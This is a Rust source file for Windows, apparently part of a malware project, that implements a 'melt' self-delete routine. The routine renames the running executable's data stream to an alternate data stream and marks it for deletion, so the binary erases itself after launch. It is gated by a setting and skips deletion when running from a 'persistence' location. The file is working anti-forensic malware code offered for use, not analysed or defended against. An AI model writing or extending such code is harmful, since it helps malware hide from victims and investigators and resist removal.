use crate::recovery::settings::RecoveryControl;
use std::ffi::c_void;
use std::mem::size_of;
use tracing::{debug, error, info};
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, DELETE, FILE_ATTRIBUTE_NORMAL, FILE_DISPOSITION_INFO, FILE_RENAME_INFO,
    FILE_SHARE_DELETE, FILE_SHARE_READ, FileDispositionInfo, FileRenameInfo, OPEN_EXISTING,
    SetFileInformationByHandle,
};
use windows::core::PCWSTR;

#[cfg(feature = "persistence")]
fn check_persistence() -> bool {
    crate::recovery::persistence::is_running_from_persistence()
}

#[cfg(not(feature = "persistence"))]
fn check_persistence() -> bool {
    false
}

pub fn perform_melt() {
    if !RecoveryControl::global().melt_enabled() {
        debug!("melt (self-delete) is disabled");
        return;
    }

    if check_persistence() {
        debug!("running from persistence location, skipping melt");
        return;
    }

    info!("attempting to melt (self-delete) original executable");

    unsafe {
        if let Err(e) = perform_silent_delete() {
            error!("failed to melt: {}", e);
        } else {
            info!("executable marked for deletion on close");
        }
    }
}

pub unsafe fn perform_silent_delete() -> Result<(), String> {
    let current_exe = std::env::current_exe().map_err(|e| e.to_string())?;
    let path_w: Vec<u16> = current_exe
        .to_string_lossy()
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();

    let handle = unsafe {
        CreateFileW(
            PCWSTR(path_w.as_ptr()),
            DELETE.0,
            FILE_SHARE_READ | FILE_SHARE_DELETE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE::default(),
        )
    }
    .map_err(|e| format!("failed to open file for deletion: {}", e))?;

    if handle.is_invalid() {
        return Err("invalid file handle".to_string());
    }

    let stream_name = ":wtf\0".encode_utf16().collect::<Vec<u16>>();
    let rename_info_size = size_of::<FILE_RENAME_INFO>() + (stream_name.len() * 2);
    let mut buffer = vec![0u8; rename_info_size];
    let rename_info = unsafe { &mut *(buffer.as_mut_ptr() as *mut FILE_RENAME_INFO) };

    rename_info.Anonymous.ReplaceIfExists = true.into();
    rename_info.RootDirectory = HANDLE::default();
    rename_info.FileNameLength = ((stream_name.len() - 1) * 2) as u32;

    unsafe {
        std::ptr::copy_nonoverlapping(
            stream_name.as_ptr(),
            rename_info.FileName.as_mut_ptr(),
            stream_name.len() - 1,
        );
    }

    if unsafe {
        SetFileInformationByHandle(
            handle,
            FileRenameInfo,
            buffer.as_ptr() as *const c_void,
            rename_info_size as u32,
        )
    }
    .is_err()
    {
        let _ = unsafe { CloseHandle(handle) };
        return Err("failed to rename to ADS".to_string());
    }

    let delete_info = FILE_DISPOSITION_INFO {
        DeleteFile: true.into(),
    };

    if unsafe {
        SetFileInformationByHandle(
            handle,
            FileDispositionInfo,
            &delete_info as *const _ as *const c_void,
            size_of::<FILE_DISPOSITION_INFO>() as u32,
        )
    }
    .is_err()
    {
        let _ = unsafe { CloseHandle(handle) };
        return Err("failed to set delete disposition".to_string());
    }

    let _ = unsafe { CloseHandle(handle) };
    Ok(())
}
